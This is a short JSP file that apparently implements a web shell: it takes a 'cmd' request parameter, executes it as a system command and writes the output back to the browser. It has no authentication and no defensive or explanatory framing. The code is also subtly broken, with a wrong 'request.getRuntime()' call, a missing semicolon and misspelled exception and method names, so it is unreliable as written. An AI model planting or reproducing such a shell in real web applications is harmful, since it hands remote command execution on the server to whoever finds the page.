<%@ page import="java.io.*" %>

<%
	try{
		String cmd = request.getParameter("cmd");
		Process child = request.getRuntime().exec(cmd);
		InputStream in = child.getInputStream();
		int c;
		
		while ((c = in.read()) != -1){
			out.print((char)c);
		}
		
		in.close()
		
		try{
			child.waitFor();
		}catch(InterruptedExeption e){
			e.printStatckTrace();
		}
	}catch(IOException e){
		System.err.println(e);
	}
%>